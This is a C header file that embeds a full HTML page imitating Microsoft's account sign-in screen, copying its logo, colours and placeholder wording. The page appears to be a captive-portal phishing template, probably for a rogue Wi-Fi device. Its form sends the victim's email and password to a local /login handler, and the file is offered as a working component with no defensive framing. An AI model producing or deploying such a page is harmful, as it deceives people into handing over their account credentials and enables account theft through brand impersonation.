#ifndef PORTAL_MICROSOFT_H
#define PORTAL_MICROSOFT_H

const char PORTAL_MICROSOFT_HTML[] = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f2f2f2;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            padding: 44px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 4px;
            margin-bottom: 16px;
        }
        .logo-squares {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2px;
            width: 21px;
            height: 21px;
        }
        .logo-squares div {
            background: #f25022;
        }
        .logo-squares div:nth-child(2) { background: #7fba00; }
        .logo-squares div:nth-child(3) { background: #00a4ef; }
        .logo-squares div:nth-child(4) { background: #ffb900; }
        .logo span {
            font-size: 20px;
            color: #5e5e5e;
            margin-left: 4px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 6px 10px;
            border: none;
            border-bottom: 1px solid #666;
            font-size: 15px;
            outline: none;
        }
        input:focus {
            border-bottom: 2px solid #0067b8;
            padding-bottom: 5px;
        }
        .no-account {
            font-size: 13px;
            color: #666;
            margin-bottom: 16px;
        }
        .no-account a {
            color: #0067b8;
            text-decoration: none;
        }
        .no-account a:hover {
            text-decoration: underline;
        }
        button {
            background: #0067b8;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 15px;
            cursor: pointer;
            min-width: 108px;
        }
        button:hover {
            background: #005da6;
        }
        .options {
            margin-top: 20px;
        }
        .options a {
            display: block;
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
            margin-bottom: 8px;
        }
        .options a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-squares">
                <div></div><div></div><div></div><div></div>
            </div>
            <span>Microsoft</span>
        </div>
        <h1>Sign in</h1>
        <form action="/login" method="GET">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <p class="no-account">No account? <a href="#">Create one!</a></p>
            <button type="submit">Sign in</button>
        </form>
        <div class="options">
            <a href="#">Sign-in options</a>
            <a href="#">Can't access your account?</a>
        </div>
    </div>
</body>
</html>
)rawliteral";

#endif
